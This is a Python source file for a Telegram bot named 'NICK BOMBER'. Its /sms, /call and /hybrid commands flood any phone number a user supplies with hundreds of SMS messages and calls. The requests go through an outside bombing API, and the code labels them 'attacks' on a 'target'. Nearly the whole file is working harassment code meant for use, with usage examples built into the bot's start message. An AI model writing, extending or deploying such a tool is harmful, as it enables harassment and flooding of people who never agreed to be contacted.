# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════╗
║     NICK BOMBER - ULTRA SIMPLE        ║
║         Owner: @NICKPAPAJI            ║
║      NO CHANNEL JOIN REQUIRED         ║
╚════════════════════════════════════════╝
"""

import os
import asyncio
import aiohttp
import random
import time
import re
import threading
from datetime import datetime
from telethon import TelegramClient, events
from flask import Flask

# =============== CONFIG ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
OWNER_ID = int(os.environ.get('OWNER_ID', 7860365469))
BOT_USERNAME = 'NickBomberRobot'

print("🚀 Starting NICK BOMBER...")
print(f"👑 Owner: @NICKPAPAJI")
print(f"🤖 Bot: @{BOT_USERNAME}")

# =============== BOT ===============
bot = TelegramClient('bot', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
bot.start(bot_token=BOT_TOKEN)
print("✅ Bot connected!")

# =============== SIMPLE BOMBER ===============
class Bomber:
    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.base = "https://www.callbomberz.in/api/v2"
    
    async def sms(self, phone, count):
        success = 0
        for i in range(min(count, 100)):  # Max 100 SMS
            try:
                async with self.session.post(
                    f"{self.base}/sms/send",
                    json={'phone': phone, 'country_code': '91'},
                    timeout=2
                ) as resp:
                    if resp.status == 200:
                        success += 1
                await asyncio.sleep(0.3)
            except:
                pass
        return success
    
    async def call(self, phone, count):
        success = 0
        for i in range(min(count, 50)):  # Max 50 calls
            try:
                async with self.session.post(
                    f"{self.base}/call/initiate",
                    json={'phone': phone, 'country_code': '91'},
                    timeout=2
                ) as resp:
                    if resp.status == 200:
                        success += 1
                await asyncio.sleep(1)
            except:
                pass
        return success
    
    async def hybrid(self, phone, sms_count, call_count):
        sms_ok = await self.sms(phone, sms_count)
        await asyncio.sleep(1)
        call_ok = await self.call(phone, call_count)
        return sms_ok, call_ok
    
    async def close(self):
        await self.session.close()

bomber = Bomber()

# =============== FLASK ===============
app = Flask(__name__)

@app.route('/')
def home():
    return "NICK BOMBER RUNNING 🔥"

@app.route('/health')
def health():
    return "OK"

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

# =============== HANDLERS - NO VERIFICATION ===============

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    """Start command - direct menu"""
    await event.reply("""
╔════════════════════════════════════════╗
║     🔥 NICK BOMBER BOT 🔥              ║
║         Owner: @NICKPAPAJI            ║
║      NO CHANNEL JOIN REQUIRED         ║
╚════════════════════════════════════════╝

📌 **COMMANDS:**
• `/sms 91xxxxxx 100` - SMS Bomb
• `/call 91xxxxxx 50` - Call Bomb
• `/hybrid 91xxxxxx` - Both Attack

🚀 **EXAMPLES:**
`/sms 917894561230 200`
`/call 917894561230 100`
`/hybrid 917894561230`

🔥 **JUST BOMB!**
    """)

@bot.on(events.NewMessage(pattern='/sms'))
async def sms_cmd(event):
    """SMS bombing command"""
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Usage: `/sms 917894561230 100`")
        
        # Extract phone number
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number!")
        
        # Extract count
        count = int(parts[2]) if len(parts) > 2 else 50
        count = min(count, 500)  # Safety limit
        
        # Start bombing
        msg = await event.reply(f"📱 **SMS Bombing Started**\nTarget: `+{phone}`\nCount: {count}")
        
        start_time = time.time()
        success = await bomber.sms(phone, count)
        elapsed = int(time.time() - start_time)
        
        # Result
        await msg.edit(
            f"✅ **SMS Bombing Complete!**\n\n"
            f"📱 Target: `+{phone}`\n"
            f"✅ Success: {success}/{count}\n"
            f"⏱️ Time: {elapsed}s\n"
            f"📊 Rate: {(success/count)*100:.1f}%"
        )
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

@bot.on(events.NewMessage(pattern='/call'))
async def call_cmd(event):
    """Call bombing command"""
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Usage: `/call 917894561230 50`")
        
        # Extract phone number
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number!")
        
        # Extract count
        count = int(parts[2]) if len(parts) > 2 else 20
        count = min(count, 200)  # Safety limit
        
        # Start bombing
        msg = await event.reply(f"📞 **Call Bombing Started**\nTarget: `+{phone}`\nCalls: {count}")
        
        start_time = time.time()
        success = await bomber.call(phone, count)
        elapsed = int(time.time() - start_time)
        
        # Result
        await msg.edit(
            f"✅ **Call Bombing Complete!**\n\n"
            f"📱 Target: `+{phone}`\n"
            f"✅ Connected: {success}/{count}\n"
            f"⏱️ Time: {elapsed}s\n"
            f"📊 Rate: {(success/count)*100:.1f}%"
        )
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

@bot.on(events.NewMessage(pattern='/hybrid'))
async def hybrid_cmd(event):
    """Hybrid attack command"""
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Usage: `/hybrid 917894561230`\nOr: `/hybrid 917894561230 50 25`")
        
        # Extract phone number
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number!")
        
        # Extract counts
        if len(parts) >= 4:
            sms_count = min(int(parts[2]), 200)
            call_count = min(int(parts[3]), 100)
        else:
            sms_count = 50
            call_count = 25
        
        # Start hybrid attack
        msg = await event.reply(
            f"💥 **HYBRID ATTACK STARTED** 💥\n\n"
            f"📱 Target: `+{phone}`\n"
            f"📨 SMS: {sms_count}\n"
            f"📞 Calls: {call_count}"
        )
        
        start_time = time.time()
        sms_ok, call_ok = await bomber.hybrid(phone, sms_count, call_count)
        elapsed = int(time.time() - start_time)
        
        total_ok = sms_ok + call_ok
        total_req = sms_count + call_count
        
        # Result
        await msg.edit(
            f"✅ **HYBRID ATTACK COMPLETE!** ✅\n\n"
            f"📱 Target: `+{phone}`\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📨 SMS: {sms_ok}/{sms_count}\n"
            f"📞 Calls: {call_ok}/{call_count}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total: {total_ok}/{total_req}\n"
            f"⏱️ Time: {elapsed}s\n"
            f"🔥 Rate: {(total_ok/total_req)*100:.1f}%"
        )
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_cmd(event):
    """Broadcast - owner only"""
    if event.sender_id != OWNER_ID:
        return
    
    msg = event.text[10:].strip()
    if not msg:
        return await event.reply("❌ Message do!")
    
    await event.reply(f"📢 Broadcast: {msg}")

@bot.on(events.NewMessage)
async def echo(event):
    """Echo for testing"""
    if not event.text.startswith('/'):
        await event.reply(f"Use commands: /sms, /call, /hybrid")

# =============== MAIN ===============
async def main():
    print("="*50)
    print("🔥 NICK BOMBER - ULTRA SIMPLE 🔥")
    print("="*50)
    print(f"👑 Owner: @NICKPAPAJI")
    print(f"🤖 Bot: @{BOT_USERNAME}")
    print(f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}")
    print("="*50)
    print("✅ NO CHANNEL JOIN REQUIRED")
    print("✅ JUST SEND COMMANDS")
    print("="*50)
    await bot.run_until_disconnected()

if __name__ == '__main__':
    # Start Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Run bot
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n❌ Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        asyncio.run(bomber.close())
